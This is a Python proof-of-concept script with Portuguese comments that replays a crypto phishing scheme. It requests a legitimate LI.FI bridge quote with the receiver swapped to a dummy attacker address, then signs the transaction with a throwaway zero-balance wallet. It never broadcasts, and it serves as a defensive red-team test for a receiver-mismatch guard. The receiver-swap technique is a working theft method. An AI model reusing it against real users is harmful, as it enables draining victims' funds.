#!/usr/bin/env python3
"""
================================================================================
PoC CAMADA 3 — O GOLPE COMPLETO, ATÉ A ASSINATURA (red-team defensiva)
================================================================================
O que este script faz — EXATAMENTE o pipeline do site de phishing, do request
à assinatura, com UMA diferença que o torna inofensivo:
  * A "vítima" é uma carteira DESCARTÁVEL gerada agora, com ZERO saldo.
  * A transação é assinada e NUNCA transmitida (sem broadcast).
  * Como a carteira-demo não tem ETH, essa transação NUNCA PODERIA executar.
  * O "golpista" é o dummy 0xDeaDBeef...00. Ninguém é lesado.

Pipeline replicado (idêntico ao do atacante):
  1. Gerar carteira vítima-demo (chave privada aleatória, saldo zero)
  2. Chamar li.quest/v1/quote com receiver = CARTEIRA DO "GOLPISTA"
  3. Montar a transação legítima que a API devolveu
  4. ASSINAR com a chave da vítima-demo (EIP-155) — como a carteira dela faria
  5. Verificar a assinatura localmente (ecrecover) — prova de validade
  6. Mostrar: o que o explorador/simulador veria (tudo legítimo)
     vs. o que o ZEUS GUARD/INV9 veria (receiver do request ≠ carteira)

O artefato final (raw tx assinada) é INERTE: sem ETH não há gás; sem broadcast
não há mempool. É uma prova de conceito de engenharia reversa, não um ataque.
"""
import requests, json, time
from eth_account import Account

API = "https://li.quest/v1/quote"
RPC = "https://arb1.arbitrum.io/rpc"
BOB = "0xDeaDBeef00000000000000000000000000000000"            # dummy "golpista"
USDC_ARB  = "0xaf88d065e77c8cc2239327c5edb3a432268e5831"
USDC_BASE = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"

def rpc(method, params):
    r = requests.post(RPC, json={"jsonrpc":"2.0","id":1,"method":method,"params":params}, timeout=30).json()
    return r.get("result")

print("="*76)
print("PoC CAMADA 3 — golpe replicado até a assinatura | SEM broadcast | SEM vítima")
print("="*76)

# ---- PASSO 1: a "vítima" — carteira descartável, saldo ZERO ----------------
acct = Account.create()  # entropia aleatória, gerada agora
vic = acct.address
print(f"\n[P1] Carteira vítima-DEMO gerada (descartável, saldo ZERO):")
print(f"     endereço:  {vic}")
bal = rpc("eth_getBalance", [vic, "latest"])
print(f"     saldo:     {int(bal,16)/1e18} ETH (confirmado on-chain)")

# ---- PASSO 2: o request do "site falso" (receiver = golpista) ----------------
print(f"\n[P2] REQUEST do site-falso à API oficial (o único campo do crime):")
print(f"     GET li.quest/v1/quote?fromChain=42161&toChain=8453"
      f"&fromAmount=300000000&fromAddress={vic}")
print(f"     &receiver={BOB}   <-- CARTEIRA DO GOLPISTA (dummy)")
q = requests.get(API, params={
    "fromChain":42161, "toChain":8453, "fromToken":USDC_ARB, "toToken":USDC_BASE,
    "fromAmount":300000000, "fromAddress":vic, "receiver":BOB}, timeout=30).json()
tr = q["transactionRequest"]
print(f"\n     API respondeu (HTTP 200, sem restrição alguma):")
print(f"     executor:  {tr['to']}  (LI.FI Diamond OFICIAL)")
print(f"     rota:      {q.get('tool')}")
print(f"     toAddress exibido na resposta (display): {q['action']['toAddress']}")
print(f"     ^-- engano: a resposta mostra o endereço da vítima, mas o")
print(f"         compromisso no calldata aponta para {BOB}")

# ---- PASSO 3: montar a transação como a carteira da vítima montaria ---------
nonce = int(rpc("eth_getTransactionCount", [vic, "latest"]), 16)
gas_price = int(rpc("eth_gasPrice", []), 16)
tx = {
    "nonce": nonce,
    "gasPrice": gas_price,
    "gas": int(tr["gasLimit"], 16) if isinstance(tr["gasLimit"], str) else tr["gasLimit"],
    "to": tr["to"],
    "value": int(tr.get("value", "0x0"), 16) if isinstance(tr.get("value", 0), str) else tr.get("value", 0),
    "data": tr["data"],
    "chainId": 42161,
}
print(f"\n[P3] Transação montada (exatamente o que o pop-up da carteira mostraria):")
print(f"     nonce={tx['nonce']} | gas={tx['gas']} | chainId=42161")
print(f"     data: {tx['data'][:60]}... ({len(tx['data'])//2-1} bytes)")

# ---- PASSO 4: A ASSINATURA (a parte que você pediu) -------------------------
signed = Account.sign_transaction(tx, acct.key)
print(f"\n[P4] ASSINADA pela chave da vítima-demo (EIP-155):")
print(f"     v: {signed.v}")
print(f"     r: 0x{signed.r:064x}")
print(f"     s: 0x{signed.s:064x}")
raw = signed.raw_transaction.hex()
raw = raw if raw.startswith("0x") else "0x"+raw
print(f"     raw tx: {raw[:80]}...")
print(f"              ...({len(raw)//2-1} bytes) — NÃO TRANSMITIDA")

# ---- PASSO 5: verificação local da assinatura (ecrecover) -------------------
rec = Account.recover_transaction(raw)
print(f"\n[P5] Verificação da assinatura (ecrecover local): {rec}")
print(f"     assinante recupera para a vítima-demo: {rec.lower()==vic.lower()}"
      f"  ← assinatura é CRIPTOGRAFICAMENTE válida")

# ---- PASSO 6: os dois olhares ------------------------------------------------
print(f"\n[P6] O QUE CADA UM VÊ NESTA MESMA TRANSAÇÃO:")
print(f"     Explorador/simulador: 'bridge LI.FI legítimo, contrato rotulado'")
print(f"     ZEUS GUARD/INV9:      'receiver do request ({BOB[:10]}..) != carteira'")
print(f"                            conectada ({vic[:10]}..) → BLOQUEAR'")
print("\n" + "="*76)
print("FIM DA PROVA. Nada foi transmitido. A carteira-demo não tem ETH:")
print("esta transação NUNCA poderia executar. O artefato é inerte — vale como")
print("evidência de engenharia (assinatura válida, pipeline do golpe completo)")
print("e como caso de teste do INV9. Sem vítimas. Sem broadcast. Sem crime.")
print("="*76)
